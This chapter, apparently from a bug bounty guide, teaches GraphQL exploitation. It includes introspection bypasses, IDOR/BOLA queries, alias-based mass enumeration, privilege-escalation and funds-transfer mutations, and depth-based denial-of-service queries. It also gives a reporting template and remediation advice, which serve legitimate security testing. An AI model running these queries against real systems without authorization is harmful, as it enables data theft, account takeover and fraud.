# Chapter 38 – GraphQL Advanced Security  
Introspection • Overfetching • Underfetching • Resolver Abuse • Hidden Fields • Authorization Bypass

GraphQL is extremely powerful — and extremely easy to misconfigure.  
Because GraphQL exposes *exactly* how backend objects work, it becomes a goldmine for attackers.

This chapter covers **real-world elite-level GraphQL exploitation techniques**.

---

# 1. Why GraphQL Is Dangerous
Three core attack surfaces:

### 1. Overfetching  
You can request **more data** than the UI intended.

Example:
query {
user(id: 1) {
id
email
isAdmin
passwordHash
}
}

yaml
Copy code

### 2. Underfetching  
Attackers can access **hidden fields** that do not appear in the UI but exist in the schema.

### 3. Resolver Abuse  
Each field in GraphQL runs a **resolver function**.  
If resolvers aren’t protected individually → **BOLA & privilege escalation** happen.

---

# 2. First Step: Introspection (The Schema Dump)

Try:
query {
__schema {
types {
name
fields {
name
}
}
}
}

csharp
Copy code

If allowed:
→ You get **the entire backend structure**.

If introspection is disabled, try these bypasses:

## 2.1 Aliased Introspection  
query {
a:__schema { types { name } }
}

shell
Copy code

## 2.2 Case Manipulation  
__SCHEMA
__Schema
__ScHeMa

shell
Copy code

## 2.3 Fragment-Based Bypass  
query Introspect {
...on __Schema { types { name } }
}

markdown
Copy code

If ANY of these work → **schema dump achieved**.

---

# 3. High-Value Fields to Extract

Look for:

### User-related:
- `password`
- `passwordHash`
- `resetToken`
- `email`
- `phone`
- `role`
- `permissions`

### Capability fields:
- `admin`
- `isSuperUser`
- `canEditUsers`
- `internalOnly`

### Backend paths:
- `filePath`
- `documentPath`
- `storageKey`

### Hidden mutations:
- `deleteUser`
- `updateRole`
- `transferFunds`
- `setAdminStatus`

These usually shouldn’t be exposed.

---

# 4. GraphQL BOLA (Most Common Exploit)

GraphQL resolvers often forget per-object authorization.

Example request:
query {
user(id: 5) { email, balance }
}

yaml
Copy code

If attacker can change the ID:
query {
user(id: 6) { email, balance }
}

yaml
Copy code

→ Full access to another user’s account.

This is one of the **highest-paid GraphQL bugs**.

---

# 5. Nested Object Abuse  
GraphQL allows infinite nesting.

If you see:
user {
posts {
comments {
author {
email
}
}
}
}

powershell
Copy code

Try expanding deeper:

user(id:1) {
posts {
comments {
author {
id
email
isAdmin
passwordHash
}
}
}
}

yaml
Copy code

Often fields at deep nesting levels lack authorization.

---

# 6. Batch Attacks (Turn GraphQL into a Mass-Enumeration Engine)

Use **aliasing** to brute force IDs in one request:

query {
u1: user(id:1) { email }
u2: user(id:2) { email }
u3: user(id:3) { email }
u4: user(id:4) { email }
u5: user(id:5) { email }
}

yaml
Copy code

If it works:
→ **Huge data leak.**

---

# 7. GraphQL Mutations (High Impact)

Mutations are the backend’s write operations.

Examples to attack:

### 7.1 Privilege Escalation
mutation {
updateUser(id:3, role:"admin") {
id
role
}
}

shell
Copy code

### 7.2 Financial Manipulation
mutation {
transferFunds(from:1, to:2, amount:10000)
}

bash
Copy code

### 7.3 Business Logic Abuse  
mutation {
cancelOrder(orderId:42)
}

yaml
Copy code

If the resolver lacks proper authorization:
→ Immediate high-severity finding.

---

# 8. DoS on GraphQL (Query Depth Attacks)

Try forcing deep recursion:

query {
user(id:1) {
friends {
friends {
friends {
friends {
friends {
id
}
}
}
}
}
}
}

yaml
Copy code

If server hangs → **Denial of Service**.

Also test:

- **Query depth**  
- **Query complexity**  
- **Recursive fragments**  

---

# 9. Hidden Endpoints (GraphQL as Recon Tool)

Two common hidden surface areas:

## 9.1 Hidden Mutations  
Run introspection for “Mutation” type:
{
__type(name:"Mutation") {
fields { name }
}
}

csharp
Copy code

## 9.2 Unused Fields  
Developers leave internal fields unprotected.

Example:
internalNotes
debugInfo
adminMetadata

markdown
Copy code

---

# 10. Automation Tools for GraphQL Hacking

Recommended tools:

- **GraphQL Raider (Burp Suite extension)**  
- **GraphQLMap**  
- **InQL Scanner**  
- **GraphMan (Postman alternative)**  
- Custom scripts using **python + requests**

---

# 11. Reporting Template (Professional)

Include:

### **1. Schema dump**
Screenshots or response showing hidden fields.

### **2. Vulnerable request**
Show GraphQL query + response.

### **3. What should happen**
User should not see other users’ data.

### **4. What actually happens**
Attacker accesses unauthorized sensitive fields.

### **5. Impact**
- PII leak  
- Financial exposure  
- Privilege escalation  
- Admin panel disclosure  

### **6. Remediation**
- Disable introspection in production  
- Apply authorization in resolvers  
- Implement depth and complexity limits  
- Remove unused fields  
- Use allow-lists for safe fields  

---

# Summary

GraphQL systems leak more information than REST if misconfigured.  
Mastering these attacks gives you:

- massive data leaks  
- privilege escalation  
- full schema knowledge  
- hidden APIs  
- financial manipulation  
- admin-level access  

This is foundational for elite bug bounty hunters.
